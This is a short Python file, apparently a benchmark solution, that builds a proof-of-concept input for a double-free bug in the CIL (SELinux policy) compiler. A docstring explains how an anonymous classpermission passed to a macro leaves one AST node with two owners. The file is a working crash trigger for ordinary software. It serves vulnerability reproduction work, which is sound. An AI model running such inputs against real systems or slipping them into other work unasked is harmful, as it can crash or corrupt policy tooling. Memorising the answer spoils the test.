class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a double free in the CIL compiler when an anonymous
        classpermission is passed to a macro that uses it in a classpermissionset
        rule. The macro expansion causes the AST node for the anonymous
        classpermission to be referenced by both the 'call' statement's arguments
        and the new 'classpermissionset' statement. During AST destruction, both
        owners attempt to free the same node, leading to a crash.

        The PoC consists of three CIL statements:
        1. A class definition: `(class c (p))`
           - Defines a class `c` with a permission `p`. This is a prerequisite
             for defining a classpermission.
        2. A macro definition: `(macro m ((classpermission cp)) (classpermissionset s cp))`
           - Defines a macro `m` that takes a classpermission argument `cp`.
           - The macro's body defines a classpermissionset `s` using the `cp` argument.
             This is the setup that causes the AST node aliasing.
        3. A macro call: `(call m ((c (p))))`
           - Calls the macro `m` with an anonymous (inline) classpermission `(c (p))`.
           - This is the trigger. The CIL parser creates an AST node for the anonymous
             classpermission as an argument to the call. The macro expansion then uses
             this same node, creating two "owners". When the AST is destroyed, this
             node is freed twice.
        """
        
        class_def = b"(class c (p))"
        
        macro_def = b"(macro m ((classpermission cp)) (classpermissionset s cp))"
        
        macro_call = b"(call m ((c (p))))"
        
        poc = b"\n".join([
            class_def,
            macro_def,
            macro_call,
        ])
        
        return poc